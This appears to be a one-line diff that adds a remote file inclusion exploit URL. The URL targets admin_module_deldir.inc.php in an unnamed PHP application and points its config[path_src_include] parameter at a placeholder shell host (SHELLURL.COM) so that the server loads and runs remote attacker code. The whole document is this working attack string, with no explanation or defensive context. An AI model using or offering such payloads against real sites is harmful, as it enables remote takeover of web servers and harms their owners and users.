@@ -1,0 +1,1 @@
+http://www.example.com/[Script Path]/admin_modules/admin_module_deldir.inc.php?config[path_src_include]=http://SHELLURL.COM?
